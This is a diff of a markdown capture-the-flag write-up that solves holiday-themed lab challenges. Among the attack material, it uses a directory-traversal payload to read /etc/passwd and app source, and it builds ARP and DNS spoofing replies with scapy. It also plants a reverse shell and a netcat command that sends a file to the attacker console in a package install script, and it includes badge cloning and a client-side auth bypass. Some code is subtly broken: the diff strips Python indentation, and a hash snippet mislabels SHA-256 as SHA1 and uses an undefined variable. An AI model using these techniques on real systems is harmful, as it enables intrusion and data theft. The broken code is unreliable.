@@ -1,6 +1,5 @@
 # Objective 1 - Uncover Santa's Gift List
 In this challenge, a gift list is presented in an image which has been obfuscated with a swirl image effect. The image needs to be unswirled which will reveal the names and items on the list. This is done is Photopea.
-![Twirl Command](1-gift-list/img/twirl_cmd.png)
 ![Angle Adjusted](1-gift-list/img/angle_adjust.png)
 The answer is revealed to be `Proxmark`
 
@@ -135,14 +134,14 @@ Holly Evergreen
 ## Access
 Broadcast the stolen HID code with the following command.
 ```bash
-lf hid sim -r 2006e22ee1
+lf hid sim -r 2006e22f0e
 ```
-![Secret Room Access](5-open-hid-lock/img/room.png)
+<img src="5-open-hid-lock/img/hid_unlock.png" alt="drawing" style="width:400px;"/>
 
 # Objective 5 - Splunk Challenge
 This challenge is to answer a series of questions given a provided Splunk dataset. After completion, an encrypted value holds the flag which needs to be entered to complete the challenge. The password for the encrypted string can be guessed by watching the Splunk talk from this year's Kringelcon.
 
-## Question 1 - Total Unique ATTACk Techniques
+## Question 1 - Total Unique ATTACK Techniques
 Run the specific splunk query to get the list if indexes. Copy and paste the results to a text file and use unix command line tools to process the data to the correct answer.
 
 ```splunk
@@ -192,7 +191,8 @@ Search for OSTAP in Atomic Red Team, we see it is mentioned in T1105. Searching 
 index=t1105-*
 ```
 The tests must be executed, so looking at the running processes, powershell becomes a likely suspect given MITRE red team tests are involved so simple languages like cmd.exe are not well suited.
-![Processes](6-splunk/img/processes.png)
+
+<img src="6-splunk/img/processes.png" alt="drawing" style="width:400px;"/>
 
 2. Refine the Search for only powershell
 ```splunk
@@ -203,13 +203,15 @@ index=t1105-* cmdline powershell
 ![Powershell Events](6-splunk/img/getting_powershell_events.png)
 
 3. Find Tests
-Looking through the results, the 4th event down is a powershell invocation using base64 script body, often times used in powershell bypasses. This seems like a likely candidate. Grab the payload and look at it. Start stepping through the encoded payloads. It starts to become clear invoke-powershell is being used to execute these tests. Therefore, we need to find the actual invocation of the test. Something like Invoke-Atomics T1105
-![Atomic Red Team Detection](6-splunk/img/invoke-powershell-detected.png)
-The invocation was discovered shortly after
+Looking through the results, the 4th event down is a powershell invocation using base64 script body, often times used in powershell bypasses. This seems like a likely candidate. Grab the payload and look at it. Start stepping through the encoded payloads. It starts to become clear invoke-powershell is being used to execute these tests. Therefore, we need to find the actual invocation of the test. 
+
+The invocation was discovered shortly after:
 ![T1105](6-splunk/img/t1105_invocation.png)
 
 **Well none of this worked**
-Over thought it as per the hints. They maintain an index which is where they want the answer from. The answers determine above however can technically be correct depending on the definition of when the tests are started.
+
+Over thought it as per the hints. They maintain an index which is where they want the answer from. 
+
 ![OSTP Activity](6-splunk/img/Overthought.png)
 ### Answer
 2020-11-30T17:44:15Z
@@ -270,13 +272,11 @@ This challenge revolves around sifting through CAN bus signals on Santa's sleigh
 ## Approach
 The initial UI has scrolling signals messages with their data payload. The signals format are: `time SIGNAL_ID#SIGNAL_DATA`. The filtering mechanism provides a way to match signals and their payloads. This can be all data, specific data or data greater than or less than the specified value. The console also provides several operational buttons which will modify the signals to control the sleigh.
 
-![Console](7-can-bus/img/main_console.png)
-
 ## Strategy
 The overall strategy will be as follows:
 1. Identify each signal by isolating every signal until the console is not scrolling
 2. Determine each signal's purpose by looping in 1 and testing which control exercises that signal
-    * Test the bounds of the signal when applicable
+* Test the bounds of the signal when applicable
 3. Once all signals are identified, remove the unknown signals via the filter
 
 ## Results
@@ -306,7 +306,6 @@ An unknown signal of ID 188 is seen periodically broadcasting the payload value 
 * 080 - Make sure value is > 0x00 and < 0x65
 
 The above filters did not solve the challenge.
-![Failure 1](7-can-bus/img/filter1_failed.png)
 ## Filter Set 2 - Some Help In Refining - Failure
 After this did not work, the signals were all double checked and the results validated. So, the in-game hints were sought out which focused the the light on two specific areas, the brakes and the locks. Having already verified the signals in the noise, it out seem that the unknown signal 188 might not be malicious in nature and should be removed from the filters. This was done, but no success
 * 18B - Remove value 0xF2057
@@ -329,7 +328,8 @@ Various files were tested uploading to the site and the results were monitored v
 1. Can only upload png files (file extension checking)
 2. Uploaded files are renamed and accessed via the `image` endpoint with a seemingly random guid file name
 3. Invalid file names reveal the web app source location
-![Error Messages](8-tag-generatorimg/image_error_msg.png)
+
+![Error Messages](8-tag-generator/img/image_error_msg.png)
 
 ## Testing for Directory Traversal
 ### Upload
@@ -338,10 +338,10 @@ The filename parameter is user controllable (along with the contents of the file
 ### Image
 The image endpoint takes in the `id` parameter which points to the image file in the format `guid.png`. It is possible, given the id's are ending in `.png` that the function is looking in a directory. Passing on a usual test for directory traversal `../../../../../../etc/passwd` shows that it is susceptible to this vulnerability and is exploitable in the form of a local file inclusion (LFI).
 
-![LFI](8-tag-generatorimg/lfi.png)
+![LFI](8-tag-generator/img/lfi.png)
 
 ### Exploiting the LFI
-The passwd file exfiltration is proof but not helpful in advancing the objectives. The shadow file was attempted which was unsuccessful. Using information from the enumeration stage, the app's main code `app.rb` was attempted to be exfiltrated and was successful. It can be viewed [here](app.rb). 
+The passwd file exfiltration is proof but not helpful in advancing the objectives. The shadow file was attempted which was unsuccessful. Using information from the enumeration stage, the app's main code `app.rb` was attempted to be exfiltrated and was successful. 
 
 ## Examining the Code
 Doing static analysis on the source code, important information and vulnerabilities were discovered. They are listed below.
@@ -369,18 +369,18 @@ This challenge required spoofing and end point by launching an ARP poisoning att
 ## Initial Enumeration
 Initially enumerating the machine provided, some observations can be made about what how this challenge will unfold.
 * apy_res.py
-    * Indicates ARP spoofing is likely
+* Indicates ARP spoofing is likely
 * dns_res.py
-    * indicates DNS spoofing is likely
+* indicates DNS spoofing is likely
 * HELP.md
-    * Talks about tcdump and tshark
-    * Will need/have the ability to packet capture
-    * Says we can launch a web browser using the python3 module on port 80
+* Talks about tcdump and tshark
+* Will need/have the ability to packet capture
+* Says we can launch a web browser using the python3 module on port 80
 * tcpdump -i eth0
-    * See a constant ARP request from a remote host
+* See a constant ARP request from a remote host
 * Sample packet captures
-    * Give a ARP Request / ARP Response pair
-    * Give a DNS Request / UDP Response pair
+* Give a ARP Request / ARP Response pair
+* Give a DNS Request / UDP Response pair
 
 Piecing it together, it seems the campaign will have the following steps
 1. Spoof ARP to redirect to 'Us' DNS
@@ -392,61 +392,70 @@ This one is pretty straight forward. Just need to reply with an ARP Reply pointi
 ### Incoming Request
 ```
 ###[ ARP ]### 
-  hwtype    = 0x1
-  ptype     = IPv4
-  hwlen     = 6
-  plen      = 4
-  op        = who-has
-  hwsrc     = 4c:24:57:ab:ed:84
-  psrc      = 10.6.6.35
-  hwdst     = 00:00:00:00:00:00
-  pdst      = 10.6.6.53
+hwtype    = 0x1
+ptype     = IPv4
+hwlen     = 6
+plen      = 4
+op        = who-has
+hwsrc     = 4c:24:57:ab:ed:84
+psrc      = 10.6.6.35
+hwdst     = 00:00:00:00:00:00
+pdst      = 10.6.6.53
 
 ```
 ### Outgoing Request
 --- indicates these fields need to to be changed to this value
 ```
- ###[ ARP ]### 
-  hwtype    = 0x2	---
-  ptype     = IPv4
-  hwlen     = 6
-  plen      = 4
-  op        = is-at (0x02) --
-  hwsrc     = 02:42:0a:06:00:03 --
-  psrc      = 10.6.6.53 --
-  hwdst     = 4c:24:57:ab:ed:84 --
-  pdst      = 10.6.6.35 --
+###[ ARP ]### 
+hwtype    = 0x2	---
+ptype     = IPv4
+hwlen     = 6
+plen      = 4
+op        = is-at (0x02) --
+hwsrc     = 02:42:0a:06:00:03 --
+psrc      = 10.6.6.53 --
+hwdst     = 4c:24:57:ab:ed:84 --
+pdst      = 10.6.6.35 --
 ```
 ### Testing
 This ARP packet was tested by constructing it via `scapy` and printing it make sure it matched the expected value above.
 Sample constructed with the following code
+
+<table><tr><td>Python Code</td><td>Output</td></tr>
+<tr><td>
+
 ```python
 if __name__ == "__main__":
-    a = ARP(pdst="10.6.6.35")
+a = ARP(pdst="10.6.6.35")
 
-    a.op = 2 # arp reply
-    a.plen = 4
-    a.hwlen = 6
-    a.ptype = 2048
-    a.hwtype = 1
-    a.hwsrc = "02:42:0a:06:00:03"
-    a.psrc = "10.6.0.3"
-    a.pdst = "10.6.6.35"
-    a.hwdst = "4c:24:57:ab:ed:84"
-    a.show()
+a.op = 2 # arp reply
+a.plen = 4
+a.hwlen = 6
+a.ptype = 2048
+a.hwtype = 1
+a.hwsrc = "02:42:0a:06:00:03"
+a.psrc = "10.6.0.3"
+a.pdst = "10.6.6.35"
+a.hwdst = "4c:24:57:ab:ed:84"
+a.show()
 ```
+
+</td><td>
+
 ```bash
 ###[ ARP ]###
-  hwtype    = 0x1
-  ptype     = IPv4
-  hwlen     = 6
-  plen      = 4
-  op        = is-at
-  hwsrc     = 02:42:0a:06:00:03
-  psrc      = 10.6.0.3
-  hwdst     = 4c:24:57:ab:ed:84
-  pdst      = 10.6.6.35
+hwtype    = 0x1
+ptype     = IPv4
+hwlen     = 6
+plen      = 4
+op        = is-at
+hwsrc     = 02:42:0a:06:00:03
+psrc      = 10.6.0.3
+hwdst     = 4c:24:57:ab:ed:84
+pdst      = 10.6.6.35
 ```
+
+</td></tr></table>
 
 These changes have been replicated into [arp_res.py](arp_res.py) python script.
 ### Results
@@ -458,29 +467,29 @@ The next step now that the ARP request/response has been hijacked is to respond 
 The DNS request was dumped in a modified version of `dns_res.py` to see fields in `scapy` terms. Interestingly, its going to what might be an FTP site. Which may mean the next stage is an FTP connection on port 21.
 ```
 ###[ DNS ]### 
-           id        = 0
-           qr        = 0
-           opcode    = QUERY
-           aa        = 0
-           tc        = 0
-           rd        = 1
-           ra        = 0
-           z         = 0
-           ad        = 0
-           cd        = 0
-           rcode     = ok
-           qdcount   = 1
-           ancount   = 0
-           nscount   = 0
-           arcount   = 0
-           \qd        \
-            |###[ DNS Question Record ]### 
-            |  qname     = 'ftp.osuosl.org.'
-            |  qtype     = A
-            |  qclass    = IN
-           an        = None
-           ns        = None
-           ar        = None
+        id        = 0
+        qr        = 0
+        opcode    = QUERY
+        aa        = 0
+        tc        = 0
+        rd        = 1
+        ra        = 0
+        z         = 0
+        ad        = 0
+        cd        = 0
+        rcode     = ok
+        qdcount   = 1
+        ancount   = 0
+        nscount   = 0
+        arcount   = 0
+        \qd        \
+        |###[ DNS Question Record ]### 
+        |  qname     = 'ftp.osuosl.org.'
+        |  qtype     = A
+        |  qclass    = IN
+        an        = None
+        ns        = None
+        ar        = None
 
 
 ```
@@ -488,36 +497,36 @@ The DNS request was dumped in a modified version of `dns_res.py` to see fields i
 The ARP and UDP portions of the packets where pretty straight forward to pull from the incoming packet and populate. The DNS response for the most part was just copied from the initial request, the only section being added is the answer field via a `DNSRR`. In this case, the response will want to respond with and `A` record and the `rdata` set to the attacker legitimate IP address. Fun fact, if you pass `type="CNAME"` rather than `A`, the challenge crashes.
 ```
 ###[ DNS ]### 
-           id        = 0
-           qr        = 0
-           opcode    = QUERY
-           aa        = 0
-           tc        = 0
-           rd        = 1
-           ra        = 0
-           z         = 0
-           ad        = 0
-           cd        = 0
-           rcode     = ok
-           qdcount   = 1
-           ancount   = 1
-           nscount   = 0
-           arcount   = 0
-           \qd        \
-            |###[ DNS Question Record ]### 
-            |  qname     = 'ftp.osuosl.org.'
-            |  qtype     = A
-            |  qclass    = IN
-           \an        \
-            |###[ DNS Resource Record ]### 
-            |  rrname    = 'ftp.osuosl.org.'
-            |  type      = A 
-            |  rclass    = IN
-            |  ttl       = 0
-            |  rdlen     = None
-            |  rdata     = '10.6.0.2'
-           ns        = None
-           ar        = None
+        id        = 0
+        qr        = 0
+        opcode    = QUERY
+        aa        = 0
+        tc        = 0
+        rd        = 1
+        ra        = 0
+        z         = 0
+        ad        = 0
+        cd        = 0
+        rcode     = ok
+        qdcount   = 1
+        ancount   = 1
+        nscount   = 0
+        arcount   = 0
+        \qd        \
+        |###[ DNS Question Record ]### 
+        |  qname     = 'ftp.osuosl.org.'
+        |  qtype     = A
+        |  qclass    = IN
+        \an        \
+        |###[ DNS Resource Record ]### 
+        |  rrname    = 'ftp.osuosl.org.'
+        |  type      = A 
+        |  rclass    = IN
+        |  ttl       = 0
+        |  rdlen     = None
+        |  rdata     = '10.6.0.2'
+        ns        = None
+        ar        = None
 ```
 ### Testing
 I attempted to test this in docker however I could not get `dig` or `nslookup` to actually send UDP requests to localhost which I was listening. 
@@ -587,6 +596,8 @@ Reverse shell failure. For whatever reason the reverse shell reaches back and cr
 ![Reverse Shell Fail](9-arping-around/img/reverse_shell_fail.png)
 Since the netcat process was able to open a session, it may be possible to cat out the contents to the target file before the session gets killed. This is done by modifying the `postinst` script to read the file rather then exec a reverse shell. `nc $CONSOLE_IP 4343 < /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt`. After making these changes the contents of the file are captured by the netcat listener!
 ![Success](9-arping-around/img/success.png)
+### Answer
+Tanta Kringle
 
 # Objective 10 - Defeat Fingerprint Sensor
 The objective if this challenge is to bypass the fingerprint scanner in the santavator to gain access to the workshop as the regular player character. This challenge is solvable by inspecting the source code of the santavator zone which reveals the check on the finger print reader is enforced client side. By modifying the source code in the browser, the check can be removed allowing a bypass to access Santa's office.
@@ -594,17 +605,129 @@ The objective if this challenge is to bypass the fingerprint scanner in the sant
 First, in the narrative of the game, using the santavator with authorization demonstrated how a normal flow occurs. The user, with authorization, clicks the button for Santa's Office then clicks the fingerprint reader. Therefore, the goal is to bypass the authorization that occur when the finger print reader is clicked.
 
 Knowing this, the click handler code can be found by tracing the element in the website's DOM through to the Javascript. After doing this trace, the code which executes the click handler can be isolated as seen below.
-
 ![Click Handler](10-fingerprint-bypass/img/fingerprint_click_handler.png)
-
 ## Bypassing
 Inspecting the code, there is a call to `hashToken('santa')` in an if block which is likely the authorization event. This would indicate the authorization is occurring client side. It is possible then to modify the running javascript in the browser and remove this check. This functionality is available in standard Chrome and Firefox developer edition. The screen shots below show the modification in Chrome.
-
-![Token Check](10-fingerprint-bypass/img/remove_token.png)
-
 ![Token Check Removed](10-fingerprint-bypass/img/removed_token.png)
-
 After modifying the source, the finger print will reader will grant you access to Santa's Workshop as the regular user.
-
 ![Regular User in Workshop](10-fingerprint-bypass/img/bypass.png)
+# Objective 11 - Naughty/Nice List with Blockchain Investigation
+This challenge entailed performing various tasks on the naughty or nice blockchain. It was broken up into two parts. The first part required using the cryptographic weakness in the mersenne twister random number generator predict the nonce values used in blocks. The second part required undoing an MD5 hash collision induced in one of the blocks to recover the original information. 
+## Part 1 - Nonce Prediction
+The nonce generation code is handled by sample python code `naughty_nice.py` which reveals it uses the built-in python random number generator which is based on the mersenne twister algorithm. This algorithm has a weakness for cryptographic applications in that, with 624 observed sequential generations, a model and be populated which will then be able to generate all future values. Within the naughty / nice blockchain, there are exactly 624 sequential nonce values which can be used to prepopulate model and predict what future nonce values will be.
 
+The script, `naughty_nice_11a.py` solves this for the `blockchain.dat` file by reporting the the next 10 values of the nonce based on the predictor. This allows the prediction of the nonce for index 130000 to be predicted and submitted.
+
+```python
+from mt19937predictor import MT19937Predictor
+pd = MT19937Predictor()
+pass_i = 0 
+i = 0
+for b in c2.blocks:
+    print("{}:{}".format(b.index,b.nonce))
+    pass_i = b.index
+    i = i + 1
+
+    if i > 624:
+        print(pd.getrandbits(64) == b.nonce)
+    else:
+        pd.setrandbits(b.nonce,64)
+print(pass_i)
+for i in range (1,10):
+    print("{}:{:x}".format(i+pass_i,pd.getrandbits(64)))
+``` 
+<img src="11-naughty-nice-blockchain/img/11a_success.png" alt="drawing" style="width:200px;"/>
+
+## Part 2 - Undo MD5 Collision
+### Finding the Tampered Block
+In part, the first step is to use the provided hash to find the block within the chain that was tampered with. The SHA1 hash of the block is `58a3b9335a6ceb0234c12d35a0564c4ef0e90152d0eb2ce2082383b38028a90f`. As describe in the question, this is the SHA1 of the whole block, not the data section which the suspect MD5 hash encompasses. Therefore, to find this hash, the SHA1 of the whole data block needs to be done and compared against the known value. THis can be done with the following code snipit below, appended to the end of the `naughty_nice.py`
+
+```python
+import hashlib
+h = hashlib.sha256()
+hv = '58a3b9335a6ceb0234c12d35a0564c4ef0e90152d0eb2ce2082383b38028a90f'
+c = Chain(load=True, filename='blockchain.dat')
+for b in c.blocks:
+m.update(b.block_data_signed())
+if m.hexdigest() == hv:
+    print(b.index)
+    break
+```
+
+After running the code, we find the block to be 129459
+### The Hints
+The hints for this challenge revealed the following which will dictate the plans moving forward.
+1. A collision was in the MD5 signature was induced
+* This block is the tampered version, need to undo it
+* This collision type is UniColl
+2. The tamper only required 4 bytes to change within the block
+### Block Enumeration
+Now that the tampered block has been revealed, it can be surveyed to to see what areas might be of interested in assessing for the 4 byte changes.
+#### Areas of Interest
+1. fields
+* Score
+    * Set to 0xFFFFFFFF, the max for the 4 byte data type of this field
+* Sign (Naughty/Nice)
+    * Set to 0x01, interpreted as nice
+    * Any < 0x01 value of this will be interpreted as naughty
+* Attachment 1
+    * Binary Blob
+    * Extracted but found not determine a file type
+* Attachment 2
+    * PDF File
+    * Extracted and viewed
+    * Noticed the file size was noticeably larger than other PDF files pulled ouf the blockchain
+
+Without some more research into MD5 collisions
+### MD5 Collision Research
+Following the reference material provided as the hints, the following observations where made.
+1. UniColl can be done with 2 byte changes involving a modification of +1 and -1 at 64 byte clock aligned byte positions
+2. An identical pretext collision (IPC) is likely used since when looking at the file structure of the block, the first 64 bytes are unlikely to be modified in the tamper event
+3. A PDF UniColl only requires 2 byte changes and can be used to render two PDF with different contents
+* Two PDFs are merged together
+* Main catalog in one points to one document tree and second PDf the other document tree
+    * This change this the first byte modification UniColl requires
+* Second byte modification falls in a comment block after the catalog
+### Analyzing the PDF
+The first byte to attempt to swap based on the research is the page number in the catalog, moving from page 2 to page 3. In so doing, the PDF, when opened through chrome renders a completely different file content. They can be seen in the screenshots below.
+
+Modified | Original
+- | - 
+![Original PDF](11-naughty-nice-blockchain/img/original_pdf.png) | ![Hidden PDF](11-naughty-nice-blockchain/img/hidden_pdf.png)
+
+Reading the contents of the PDF, the next byte modification within the block becomes apparent, the sign (naughty or nice) field was moved from 0 (naughty) to 1 (nice).
+
+At this point, we have 2 of the 4 byte modifications. Block byte 0x49 was modified with a +1 and block byte 0x109 or PDF byte 0x3F was modified with a -1.
+### Block Byte 0x49
+Some observations about this byte.
+1. Its at the 9th position in the second 64 byte block, which is a characteristic of the UniColl attack
+2. The byte is increased by 1 in the attack which aligns with the UniColl style attack.
+
+Using the above observations, it seems likely that this byte modification is the result of a UniColl with an identical prefix for each block. The prefix is the first 64 bytes, which is the first 4 fields of the block:
+Index       [0-15]
+Nonce       [16-31]
+Pid         [32-47]
+Rid         [48-63]
+Then, he modification block would see the 9th byte of the block be modified by a + 1.
+doc_count   [64]
+score       [65-71]
+sign        [72] //0x49
+
+A test with the prefix was done with [hashclash](https://github.com/cr-marcstevens/hashclash) which is seen in the screenshot below.
+![UniColl Test With Prefix](11-naughty-nice-blockchain/img/vbindiff_test_unicol_with_block_prefix.png)
+
+Thus, based on the analysis, the next byte to modified occur at 0x89, (64 bytes later). This byte occurs within the unidentified binary blob attachment to the block. Thus, this attachment is likely a "comment" section within the hash collisions view of the file format in that the data can be modified without affecting the file interpretation. The byte at 0x89 would have been decremented by 1 by the attack. Therefore, to "correct" this block from what is currently on the blockchain, byte 0x49 needs to be decremented by 1 and byte 0x89 needs to incremented by 1.
+
+Running through through the modified python code of `naught_nice.py`, the MD5 hash is the same. This indicates that collision in the PDF file is independent of the collision induced two move the bytes in block data areas. In the UniColl theory, this is because this is considered the suffix of the hash representation of the file format and can be any data. It also means that the byte modification in the PDF can be stand alone and not part of any hash collision.
+
+### PDF Byte 0x109
+This byte is required to be modified to reveal the hidden PDF within the document. This makes 3 identified bytes with one more left to discover. As indicated in the previous section, this byte modification is independent of the MD5 hash collision of the whole block and thus the third byte can be anywhere within the suffix of the initial collision. However, it is likely, given the challenge, the byte change in the PDF to hide the non-malicious PDF are related through a hash collision. Looking at the dumped PDF document (`block.dump_doc(1)`), the modification of the known byte occurs at 0x3F, which is not properly byte aligned for the UniColl exploit. Examining the file structure on disk again, it can be observed that the file storage format on the blockchain, pushes in 10 bytes, identifying the file type and size which would make it the aligned for a UniColl exploit. Furthermore, the second byte change at offset 0x89, would fall in the PDF catalog comment section which is what an attacker would want in a UniColl exploit on a PDF file. Thus, it appears that a second collision was created in the raw data format of attachment: [2 Bytes - Type][8 Bytes - Length][PDF File]. Thus, if the attacker attempted to hide this change in a hash collision, it would indicate that the 0x89 byte would need to be decremented by 1. The following changes were made.
+![UniColl 2](11-naughty-nice-blockchain/img/solution_part2_unicoll.png)
+
+Now, the final block can be reassembled as seen below.
+![Final Block](11-naughty-nice-blockchain/img/modified_block_129459.png)
+
+## Final Test
+Now with the newly assembled, the block the MD5 can be verified and the SHA1 taken.
+
+![Solution](11-naughty-nice-blockchain/img/success_hash.png)
